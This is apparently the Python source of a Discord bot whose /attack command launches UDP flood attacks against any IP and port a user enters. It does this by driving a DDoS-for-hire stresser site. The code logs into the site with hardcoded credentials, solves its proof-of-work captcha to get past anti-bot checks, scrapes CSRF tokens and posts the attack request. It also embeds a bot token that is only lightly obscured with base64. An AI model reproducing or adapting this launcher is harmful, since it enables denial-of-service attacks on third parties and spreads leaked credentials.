import discord
from discord.ext import commands
from discord import app_commands
import requests
import re
import hashlib
import time
import base64
import asyncio

# Token encode en base64
_T = "TVRRMk56TXhNREE0T1RZeU1UYzVPRGt6Tmc9PS5HSGNvNC0uVWZVNm1qT2R1WF9heEs0UEtxcURlNk5zMi1kX04za3h3dHFn"
TOKEN = base64.b64decode(base64.b64decode(_T)).decode()

USERNAME = "amyzyxr"
PASSWORD = "fuck007@@"
API_BASE_LOGIN = "https://challenge.fluxstress.to/2f05f98a86/"
API_BASE_ATTACK = "https://challenge.fluxstress.to/3aa79bd6c5/"
MAX_ATTACK_DURATION = 60

# =============================================
# FLUXSTRESS FUNCTIONS
# =============================================

def fnv32a(s):
    h = 2166136261
    for c in s:
        h ^= ord(c)
        h = (h + (h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24)) & 0xFFFFFFFF
    return h

def xorshift(state):
    state ^= (state << 13) & 0xFFFFFFFF
    state ^= (state >> 17) & 0xFFFFFFFF
    state ^= (state << 5) & 0xFFFFFFFF
    return state & 0xFFFFFFFF

def generate_string(seed_str, length):
    state = fnv32a(seed_str)
    result = ""
    while len(result) < length:
        state = xorshift(state)
        result += format(state, '08x')
    return result[:length]

def solve_pow(salt, target_hex):
    target_bytes = bytes(int(target_hex[i:i+2], 16) for i in range(0, len(target_hex), 2))
    target_len = len(target_bytes)
    nonce = 0
    while True:
        if hashlib.sha256((salt + str(nonce)).encode()).digest()[:target_len] == target_bytes:
            return nonce
        nonce += 1

def solve_challenges(session, api_base):
    res = session.post(f"{api_base}challenge", headers={"Content-Type": "application/json"})
    data = res.json()
    token = data["token"]
    ch = data["challenge"]
    c, s, d = ch["c"], ch["s"], ch["d"]
    solutions = []
    for i in range(1, c + 1):
        salt = generate_string(f"{token}{i}", s)
        target = generate_string(f"{token}{i}d", d)
        nonce = solve_pow(salt, target)
        solutions.append(nonce)
    redeem = session.post(
        f"{api_base}redeem",
        json={"token": token, "solutions": solutions},
        headers={"Content-Type": "application/json"}
    ).json()
    if redeem.get("success"):
        return redeem["token"]
    raise Exception(f"Redeem echoue: {redeem}")

def get_csrf_and_session():
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
        "Origin": "https://fluxstress.to",
        "Referer": "https://fluxstress.to/auth",
    })
    res = session.get("https://fluxstress.to/auth")
    csrf = re.search(r'id="csrf"[^>]+value="([^"]+)"', res.text)
    return session, csrf.group(1) if csrf else None

def do_login(session, username, password, csrf, cap_token):
    res = session.post(
        "https://fluxstress.to/api/auth/signin",
        data={"username": username, "password": password, "csrf": csrf, "cap_token": cap_token},
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    if "success" in res.text.lower():
        return True
    raise Exception("Login echoue")

def get_panel_csrf(session):
    res = session.get("https://fluxstress.to/panel/attack", headers={"Referer": "https://fluxstress.to/panel"})
    for pattern in [
        r'(?:id|name)="csrf"[^>]+value="([^"]+)"',
        r'"csrf"\s*[=:]\s*["\']([a-f0-9]{32,})["\']',
        r'csrf["\']?\s*[=:]\s*["\']([a-f0-9]{32,})["\']',
    ]:
        match = re.search(pattern, res.text)
        if match:
            return match.group(1)
    return None

def do_attack(host, port, duration):
    session, csrf = get_csrf_and_session()
    login_cap = solve_challenges(session, API_BASE_LOGIN)
    do_login(session, USERNAME, PASSWORD, csrf, login_cap)

    panel_csrf = get_panel_csrf(session)
    final_csrf = panel_csrf if panel_csrf else csrf
    attack_cap = solve_challenges(session, API_BASE_ATTACK)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
        "Origin": "https://fluxstress.to",
        "Referer": "https://fluxstress.to/panel/attack",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "*/*",
        "DNT": "1",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }

    payload = {
        "host": host,
        "time": str(min(duration, MAX_ATTACK_DURATION)),
        "port": str(port),
        "method": "UDP-FREE",
        "concs": "1",
        "cap_token": attack_cap,
        "csrf": final_csrf
    }

    res = session.post(
        "https://fluxstress.to/panel/api/user/launch",
        params={"type": "l4"},
        data=payload,
        headers=headers
    )
    return res.json() if res.status_code == 200 else None

# =============================================
# DISCORD BOT
# =============================================

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"[+] Bot connecte: {bot.user}")

@bot.tree.command(name="attack", description="Launch a stress test")
@app_commands.describe(
    ip="Target IP address",
    port="Target port",
    time="Duration in seconds (max 60)"
)
async def attack(interaction: discord.Interaction, ip: str, port: int, time: int):
    await interaction.response.defer(thinking=True)

    embed = discord.Embed(
        title="⚡ Preparing Attack...",
        description=f"Target: `{ip}:{port}` | Duration: `{min(time, MAX_ATTACK_DURATION)}s`",
        color=0xffcc00
    )
    await interaction.followup.send(embed=embed)

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, lambda: do_attack(ip, port, time))

    if result and result.get("status") == "success":
        end_time = "N/A"
        if result.get("attack_summary"):
            end_time = result["attack_summary"][0].get("end_time", "N/A")

        embed = discord.Embed(
            title="✅ Attack Successfully Sent!",
            color=0x00ff88
        )
        embed.add_field(name="🎯 Target", value=f"`{ip}:{port}`", inline=True)
        embed.add_field(name="⏱ Duration", value=f"`{min(time, MAX_ATTACK_DURATION)}s`", inline=True)
        embed.add_field(name="🔧 Method", value="`UDP-FREE`", inline=True)
        embed.add_field(name="🏁 End Time", value=f"`{end_time}`", inline=False)
        embed.set_footer(text=f"Requested by {interaction.user.name}")
        await interaction.edit_original_response(embed=embed)

    else:
        msg = result.get("message", "Unknown error") if result else "No response"
        embed = discord.Embed(
            title="❌ Attack Failed",
            description=f"```{msg}```",
            color=0xff4444
        )
        await interaction.edit_original_response(embed=embed)

bot.run(TOKEN)
